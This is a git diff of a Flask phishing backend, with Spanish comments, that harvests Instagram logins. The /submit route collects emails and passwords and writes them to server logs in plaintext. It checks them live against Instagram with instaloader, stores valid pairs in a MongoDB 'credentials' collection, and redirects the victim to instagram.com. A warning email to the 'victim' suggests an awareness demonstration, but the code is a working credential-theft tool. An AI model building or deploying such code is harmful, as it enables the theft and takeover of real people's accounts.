@@ -1,4 +1,4 @@
-from flask import Flask, request, render_template, jsonify, redirect
+from flask import Flask, request, render_template, redirect
 import instaloader
 from pymongo.mongo_client import MongoClient
 from pymongo.server_api import ServerApi
@@ -10,11 +10,14 @@ from email.mime.text import MIMEText
 
 app = Flask(__name__)
 
+# Configuración de logger para la muestra de logs en Vercel
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
+# Obtención de URI MongoDB desde las variables de entorno en Vercel
 uri = os.getenv("MONGODB_URI")
 
+# Configuración de BBDD MongoDB
 client = MongoClient(uri, server_api=ServerApi('1'))
 db = client.fishcatcher
 collection = db.credentials
@@ -23,25 +26,26 @@ def instaloader_check(email, password):
     loader = instaloader.Instaloader()
 
     try:
-        # Intentar iniciar sesión
+        # Intento de inicio de sesión
         loader.login(email, password)
-        return "Inicio de sesion exitoso"
+        return "Inicio de sesion correcto"
     except instaloader.exceptions.BadCredentialsException:
-        print("Credenciales incorrectas")
+        logger.error("Credenciales incorrectas")
     except instaloader.exceptions.TwoFactorAuthRequiredException:
-        print("La cuenta requiere autenticación de dos factores")
+        logger.info("La cuenta requiere autenticación de dos factores")
     except Exception as e:
-        error_message = str(e).lower()  # Convertir a minúsculas para facilitar la búsqueda
+        error_message = str(e).lower()
+        
         if "fail" in error_message and "status" in error_message:
             return "Credenciales incorrectas"
         elif "checkpoint" in error_message:
-            print("La cuenta está bloqueada por un checkpoint de Instagram")
+            logger.error("La cuenta está bloqueada por un checkpoint de Instagram")
         elif "two_factor" in error_message:
-            print("La cuenta requiere autenticación de dos factores")
+            logger.info("La cuenta requiere autenticación de dos factores")
         elif "does not exist" in error_message:
-            return "Usuario no existe"
+            return "Usuario no existente"
         else:
-            print(f"Error desconocido: {error_message}")
+            logger.error(f"Error: {error_message}")
 
 def send_email(email):
     # Configuración del remitente, destinatario y contraseña de la cuenta de correo electrónico desde donde se van a realizar los envíos
@@ -74,36 +78,40 @@ def send_email(email):
     finally:
             server.quit()
 
-
-# Ruta para la página principal
 @app.route('/')
 def index():
     return render_template('index.html')
 
-# Ruta para el procesamiento del formulario
 @app.route('/submit', methods=['POST'])
 def submit():
-    logger.info("Endpoint /submit alcanzado")
-
     try:
-        #email = request.form['email']
+        # Recolección de credenciales del formulario
         email = request.form.get('email')
-        #password = request.form['password']
         password = request.form.get('password')
-        #logger.info(f"Datos recibidos en /submit: email={email}, password={password}")
+
+        # Log en servidor con las credenciales obtenidas
+        logger.info(f"Datos recibidos: email={email}, password={password}")
+
+        # Comprobación de credenciales válidas con Instaloader
         result = instaloader_check(email, password)
 
-        if result == "Inicio de sesion exitoso":
+        # Comprobación de inicio de sesión correcto
+        if result == "Inicio de sesion correcto":
+            # Inserción de datos en la BBDD MongoDB
             collection.insert_one({"email": email, "password": password})
+
+            # Envío de e-mail de prevención a la víctima
             send_email(email)
-            logger.info("Datos almacenados correctamente en MongoDB.")
+
+            # Log en servidor con mensaje informativo de almacenamiento correcto de credenciales en caso de que sean válidas
+            logger.info("MONGODB: DATOS ALMACENADOS CORRECTAMENTE EN LA BBDD.")
         else:
-            logger.error("CREDENCIALES INVÁLIDAS, NO SE REALIZA GUARDADO EN BASE DE DATOS")
-        #return jsonify({"message": "Credenciales almacenadas correctamente"}), 200
+            # Log en servidor con mensaje de error en caso de que las credenciales no sean válidas y redireccionamiento al sitio oficial de Instagram
+            logger.error("MONGODB ERROR: CREDENCIALES INVÁLIDAS, NO SE REALIZA GUARDADO EN LA BBDD")
         return redirect("https://instagram.com")
     except Exception as e:
-        logger.error(f"Error al almacenar credenciales: {e}")
-        return jsonify({"error": str(e)}), 500
+        # Log de error en caso de error en el proceso de almacenamiento en la BBDD MongoDB
+        logger.error(f"MONGODB ERROR: ERROR AL ALMACENAR CREDENCIALES: {e}")
 
 if __name__ == '__main__':
     app.run(port=5001)
